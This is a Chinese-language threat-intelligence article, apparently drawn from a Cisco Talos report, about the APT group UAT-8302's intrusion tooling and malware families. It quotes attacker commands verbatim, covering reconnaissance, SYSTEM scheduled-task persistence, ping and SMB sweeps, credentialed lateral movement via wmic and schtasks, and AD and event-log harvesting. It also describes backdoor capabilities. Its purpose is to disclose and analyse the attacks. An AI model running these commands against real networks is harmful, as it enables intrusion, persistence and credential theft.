---
title: 解剖 UAT-8302：一个 APT 组织的完整恶意软件图谱
url: https://mp.weixin.qq.com/s/4h9hDJj9Mhq0dOMR_GQ5Jg
source: Doonsec's feed
date: 2026-05-11
fetch_date: 2026-05-12T05:33:10.449013
---

# 解剖 UAT-8302：一个 APT 组织的完整恶意软件图谱

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/eefCd8vibaic3ibbfCsC3iaXODYnicHaMT4dEE5PSZiaqvRhpNUibkEn2BGlrKqibu627yILH2KBwFL8k6kmNoxwtpGS6QibpejOHfHENJwoosqhfpTU/0?wx_fmt=jpeg)

# 解剖 UAT-8302：一个 APT 组织的完整恶意软件图谱

原创

404号浪漫
404号浪漫

404号浪漫

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

##

---

## 0x01 核心速览

【事件】【影响】

|  |  |
| --- | --- |
| 【事件】 | 【影响】 |
| Cisco Talos 评估认为，UAT-8302 是一个具有中国背景的APT组织，长期针对全球政府及相关实体进行入侵，并以信息收集、凭证窃取和网络扩散为主要目标。 | 受害者主要为全球范围内的政府机构及关联实体。攻击者使用多种定制化恶意软件及开源工具进行渗透与横向移动，对目标网络构成持续性严重威胁。 |

---

0x02 正文解读

### 2.1-组织归因与背景

高置信度评估 UAT-8302 为具有中国背景的APT组织，其主要任务是获取并维持对全球政府及相关实体的长期访问权限。该组织在入侵后期活动中表现出信息收集、凭证提取和利用现成开源工具（如 Impacket、代理工具及定制化恶意软件）进行扩散的特点。

### 2.2-初始入侵与侦察

UAT-8302 的工具集与多个以利用零日或N日漏洞获取初始访问权限的APT组织重叠，Talos 评估其遵循相同范式。初始入侵得手后，攻击者使用 Impacket 等红队工具进行初步侦察，并执行大量命令枚举主机、域、网络共享及信任关系。侦察过程中使用自定义 PowerShell 脚本（如 “whatpc.ps1”），并通过计划任务持久化该系统信息收集脚本。此外，攻击者还执行 Ping 扫描和 SMB 端口扫描，以发现更多可扩散端点。

[图 初步侦查]

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eefCd8vibaic3uh4DsRJUKcklJ0fuQm1vgibCOnjvmUukF47iawC1GiagOaalvmhhFxLOPIBRgYFicljZyiaOpibbfRicGhov0TicIwPWPqdemAzFJhgw/640?wx_fmt=png&from=appmsg)

* 其它侦察指令

```
ipconfig /allcertutil -user -store Mycertutil -user -store CAcertutil -user -store Rootwhoaminslookup www[.]google[.]comnet usecmd.exe /c net view /domaincmd.exe /c systeminfocmd.exe /c net time /domaincmd.exe /c nslookup -type=SRV _ldap._tcp
```

* 自定义的 PowerShell 脚本

```
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp\whatpc.ps1The script may be persisted to collect system information via a scheduled task:cmd.exe /c schtasks /create /tn 'ReconLiteDebug' /tr 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\windows\temp\whatpc.ps1' /sc ONCE /st 08:25 /ru SYSTEM /fcmd.exe /c schtasks /create /tn 'RunWhatPC' /tr 'c:\windows\temp\run.bat' /sc ONCE /st 23:28 /ru SYSTEM /f
```

* 网络进行 ping 扫描

```
C:/Windows/Temp/ping_scan.batC:/Windows/Temp/run_scan.batC:/Windows/Temp/nbtscan.execmd.exe /Q /c (for /l %i in (1,1,254) do @ping -n 1 -w 300 192.168.1.%i | find TTL= && echo 192.168.1.%i is alive) > C:\Windows\Temp\alive_hosts.txt
```

* SMB共享

```
cmd.exe /Q /c (for /l %i in (1,1,254) do @net use \\192.168.1.%i\IPC$ >nul 2>&1 && echo 192.168.1.%i - Port 445 is open || echo 192.168.1.%i - Port 445 is closed) > C:\Windows\Temp\portscan.txt
```

* 泛查询审计策略以获取系统日志记录配置：

```
auditpol /get /category:Logon/Logoffauditpol /get /category:*
```

* 使用 AD Explorer 等工具收集 AD 快照：

```
ae.exe -snapshot c:\windows\temp\result.dat /accepteulacmd.exe /C 7zr.exe a -mx=5 c:\windows\temp\r.7z c:\windows\temp\result.dat
```

还使用了一个用简体中文编写的工具，名为“ SharpGetUserLoginIPRP ”，该工具源自另一个中文存储库，用于从域控制器提取登录信息：

```
C:\ProgramData\S.exe 用户:密码@IP -day
```

* ```
  使用基于 Impacket 或 WMI 的远程进程创建方式，在各种端点上扩散：
  ```

```
cmd.exe /C wmic /node:IP process call create cmd.exe /c c:\programdata\e1.batcmd.exe /C schtasks /S IP /U username /P passwd /create /tn 'Runbat' /tr 'c:\windows\temp\run.bat' /sc ONCE /st 5:12 /ru SYSTEM /f
```

使用MobaXtermDecryptor等工具从多功能标签式 SSH 客户端 MobaxXterm 中提取登录凭据，从而跳转到其他端点。

* 通过 PowerShell 直接查询 AD 用户和计算机对象，从中获取信息

```
powershell -command Get-ADUser -Filter * -Property * | Select-Object Name, Displayname, LastLogonDate, PasswordLastSet, PasswordExpired, Description, EmailAddress, homeDirectory, scriptPathpowershell -command Get-ADUser -Filter * -Property * | Select-Object SamAccountName, DisplayName, Enabled, LastLogonDate, PasswordLastSet, PasswordExpired, Description, EmailAddress, HomeDirectory, ScriptPath, @{Name='Groups';Expression={((Get-ADUser $_.SamAccountName -Properties MemberOf).MemberOf | ForEach-Object { ($_ -split ',')[0] -replace '^CN=' }) -join '; '}}powershell -Command Get-ADComputer -Filter * -Property Name,DNSHostName,OperatingSystem,Description | Select-Object Name, DNSHostName, OperatingSystem, Description | Format-Table -AutoSizepowershell -Command Get-ADGroup -Filter * -Properties Members, Description | Select-Object Name, Description, @{Name='Members';Expression={ ($_.Members | ForEach-Object { ($_ -split ',')[0] -replace '^CN=' }) -join '; ' }}| Format-Table -AutoSize
```

在多个端点上收集事件日志信息及日志本身。日志是获取信息并了解目标环境中应用的安全配置和策略的绝佳来源：

```
powershell -Command Get-WinEvent -ListLog Security | Format-List LogName, FileSize, LogMode, MaximumSizeInBytes, RecordCountpowershell -command Get-EventLog -LogName System -Source NETLOGON -Newest 5000 | Where-Object { $_.Message -match "Administrator" }powershell -Command chcp 437 >$null; Get-WinEvent -FilterHashtable @{ LogName = 'Security'; ID = 4768 } | Where-Object { \$_.Message -match 'Administrador' }
```

UAT-8302 还可能会下载并运行 "gogo"和多种扫描工具，如 QScan、naabu、dddd、PortQry 和 httpx，来发现网络中的服务：

```
curl -fsSL hxxps://github[.]com/chainreactors/gogo/releases/download/v2.14.0/gogo_windows_amd64.exe -o go.exehttpx.exe -sc -title -location -f -td -r 192.168.1.1/16httpx.exe -sc -title -location -td -r 192.168.1.1/16 -o web.txthttpx.exe -sc -title -location -td -u 192.168.1.1/16 -o web.txt
```

### 2.4-定制化恶意软件部署：多家族利用

UAT-8302 部署的恶意软件家族包括 NetDraft、CloudSorcerer v3 和 VSHELL。NetDraft（亦称 NosyDoor）是基于 .NET 的 FINALDRAFT/Squidoor 变种，利用 MS Graph API 与 OneDrive C2 通信，通过 DLL 侧加载和数据文件解码启动，并依赖内嵌的 .NET 辅助库（Talos 跟踪为 “FringePorch”）执行命令、文件操作、加载插件等，其持久化通过计划任务实现。CloudSorcerer v3 同样通过侧加载三元组执行，根据注入进程名称（如 dpapimig.exe、spoolsv.exe）分派不同恶意行为，C2 信息通过读取GitHub  仓库或 GameSpot 资料页获取，并具备系统信息收集功能。VSHELL 则通过侧加载 wininet.dll 和 BIN 文件注入 explorer.exe，其下载器为 SNOWLIGHT（单字节 XOR 0x99），部分实例还使用了基于 Rust 的变种 SNOWRUST。

*[NetDraft 和 FringePorch 感染链]*

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/eefCd8vibaic11zdedOZ2wtH2gUR3icF9IPlaIhQj6ekWk3svqNYmibqny5rCsaxibAt6REp491eAFajwEEAicMrSQg9VD0Kzq4vrZVXRqichJibglA/640?wx_fmt=jpeg&from=appmsg)

* etDraft 和 FringePorch 支持以下功能：

```
1. 在端点上执行任意命令2. 在 NetDraft 的进程上下文中执行由 C2 发送的基于 .NET 的程序集3. 退出并停止执行4. 将文件上传到 C25. 将指定远程位置的文件下载到本地磁盘。6. 文件管理：更改当前工作目录、重命名文件、枚举文件以及设置写入时间延迟7. 执行 .NET 插件：此功能类似于运行任意 .NET 程序集的能力。在此，植入程序会运行所提供的插件的“Plugin.Run”函数。
```

由于 NetDraft 不具备在重启和重新登录后保持运行的能力，因此 C2 服务器向其发出的首批命令之一就是创建一个恶意计划任务：

```
schtasks /create /ru system /tn Microsoft\Windows\Maps\{a086ff1e-d6dc-45f7-b3e4-6udknw82sa} /sc hourly /mo 2 /tr 'C:\ProgramData\Microsoft\Microsoft\Appunion.exe' /F
```

UAT-8302部署的另一种恶意软件是最新版本的CloudSorcerer后门（版本3）。该恶意软件由三个侧载文件组成：一个正常文件、一个恶意的基于DLL的加载器以及一个数据文件中的实际植入程序。

```
Yandex.exe -r -p:test.ini -s:12   VMtools.exe -r -p:VM.ini -s:12
```

这些可执行文件会侧载一个名为“mspdb60[.]dll”的DLL文件 ，该DLL文件会加载并解密命令行中指定的“.ini”文件，例如“test.ini”或“vm.ini”。然后，解密后的shellcode会被注入到一组指定的良性进程中。

* #### CloudSorcerer v3 – 解密后的 shellcode

解密后的 INI 文件是卡巴斯基在 2024 年披露的CloudSorcerer (v3)的较新版本。根据进程名称（可能是其启动或注入的位置），CloudSorcerer v3 将执行以下操作之一：

```
1. 如果进程名为“dpapimig.exe”，则它将收集系统信息，将自身注入到 explorer.exe 中，并通过命名管道从 C2 接收命令代码，收集磁盘信息，枚举文件，执行任意命令，执行文件操作（删除、重命名、读取、写入等），并执行通过命名管道接收的 shellcode。2. 如果进程名为“spoolsv.exe”，则它将联系 GitHub 以获取 C2 信息并从 C2 接收命令。3. 如果进程名为“mspaint.exe”、“browser”或其他任何名称，它将把自己注入到 dpapimg.exe、spoolsv.exe 等进程中，以启动其恶意操作。
```

CloudSorcerer v3 收集的系统信息包括计算机名称、用户名和本地系统时间。

* ##### 获取C2信息

与CloudSorcerer v2类似，版本 3 也会联系合法服务以获取 C2 信息。该恶意软件会联系特定的 GitHub 代码库读取数据块，或者读取攻击者设置的 GameSpot 个人资料。对数据块进行解码以获取 C2 信息，根据 CloudSorcerer 后门的变体，该信息可以采用以下格式之一：

```
1. UAT-8302 控制的域名或 IP 地址对应的 C2 URL，恶意软件使用该 URL 与 C2 服务器建立通信，以执行恶意操作。2. UAT-8302 使用该合法服务（例如 OneDrive 或 Dropbox）的访问令牌，作为其 C2 基础设施，以获取下一阶段的有效载荷和命令
```

### 2.5-其他工具与代理后门

1-UAT-8302 在入侵中结合使用了 SNAPPYBEE/DeedRAT 与 ZingDoor 的组合，并部署了 Draculoader（通用 shellcode 加载器）。为维持后门访问，该组织在失陷主机上部署 Stowaway、anyproxy 等代理工具以及 SoftEther VPN 客户端，以隧道方式穿越网络边界。

2-在一次事件中，UAT-8302 首先部署了名为DeedRAT / SNAPPYBEE的 RAT 家族。然而，UAT-8302 几乎立即切换到了名为ZingDoor 的基于 DLL 的恶意软件家族，该家族由趋势科技于 2023 年首次披露，趋势科技已将DeedRAT 和 ZingDoor都归咎于与中国有关联的威胁行为体Earth Estries。

3-ZingDoor 也曾在 2025 年被中国威胁组织成功利用 ToolShell 漏洞后部署。

4-与此同时，UAT-8302 还部署了 Draculoader，这是一种通用 shellcode 加载器，Earth Estries和Earth Naga APT 组织也曾使用过该加载器，这些组织有攻击东南亚及其他地区政府机构的历史：

```
C:\Documents and Settings\All Users\Microsoft\Crypto\RSA\d3d8.dll
```

### 设置额外的后门访问方式

UAT-8302部署其定制恶意软件后，便开始建立其他后门访问途径。其中一种技术是在受感染的系统上设置代理服务器，利用诸如Stowaway（另一个用简体中文编写的工具）之类的工具，将企业外部的流量隧道传输到受感染的主机：

```
c:\windows\system32\wagen...